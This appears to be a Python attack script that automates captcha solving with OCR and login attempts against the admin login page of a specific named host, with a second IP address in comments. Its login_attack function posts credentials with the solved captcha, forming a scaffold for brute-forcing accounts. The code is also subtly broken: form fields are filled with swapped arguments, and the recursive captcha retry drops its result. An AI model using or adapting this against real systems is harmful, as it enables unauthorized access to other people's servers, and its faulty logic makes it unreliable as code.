#
import ddddocr, uuid, datetime, stat
import requests, json, re, os, time, random

base_captcha = "captcha"

base_url = "http://www.ximimim.top:1008"
route_login = "/admin/common/login.shtml"
route_captcha = "/captcha.shtml"


def img_ocr(img):
    ocr = ddddocr.DdddOcr()  # 实例化
    with open(str(img), 'rb') as f:  # 打开图片
        img_bytes = f.read()  # 读取图片
    res = ocr.classification(img_bytes)  # 识别
    # print(res)
    return res


def cur_create_dir():  # 创建当前日期目录
    year_month_day = datetime.datetime.now().strftime('%Y-%m-%d')

    save_file_path = os.path.join(base_captcha, year_month_day)

    if not os.path.exists(save_file_path):
        os.makedirs(save_file_path)
        os.chmod(save_file_path, stat.S_IRWXU)  # Linux下可读可写

    return save_file_path


def create_uuid_png_name():
    get_timestamp_uuid = uuid.uuid1()  # 根据 时间戳生成 uuid , 保证全球唯一
    return datetime.datetime.now().strftime('%Y-%m-%d_%H_%M_%S') + "_" + str(get_timestamp_uuid) + ".png"


def get_captcha_photo(url, captcha_uuid_name):  # 获取验证码图片
    header = {'Cookie': 'PHPSESSID=0'}
    url = url + route_captcha
    res = requests.get(url=url, headers=header, verify=False)
    with open(captcha_uuid_name, 'wb') as f:
        f.write(res.content)
    return captcha_uuid_name


def proto_to_captcha1(url, img_path):  # 获取验证码图片并且识别转验证码
    # 获取图片
    zh_model = re.compile(u'[\u4e00-\u9fa5]')  # u4e00 和 u9fa5 是中文的两个端点
    img_name = get_captcha_photo(url, img_path)  # 获取验证码并返回完整路径
    res = img_ocr(img_name)
    # 判断字符串是否仅由数字字符或者字母数字组成
    if (res.isdigit() or res.isalnum()) and not zh_model.search(res):
        return res
    else:
        print(res, "404error")
        proto_to_captcha1(url, img_path)
        print("走到这里")


def get_captcha_code():  # 获取到正确密码
    # 创建目录
    dir_path = cur_create_dir()
    # 生成图片名称
    uuid = create_uuid_png_name()
    # 获取验证码并识别
    captcha_code = proto_to_captcha1(base_url, dir_path + "/" + uuid)
    print("captcha_code=", captcha_code)
    return captcha_code


def login_attack(username, password, code):
    data = "name={0}&password={1}&captcha={2}".format(code, username, password)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'PHPSESSID=145123',
    }
    res = requests.post(url=base_url + route_login, data=data, headers=header, verify=False)
    result = json.loads(res.text)
    return result


def main():
    # url = "http://47.109.19.59:7070/admin/common/login.shtml"
    url = "http://47.109.19.59:7070"
    img = "captcha.png"


if __name__ == '__main__':
    login_attack("xx", "xx", "xxx")
    # main()
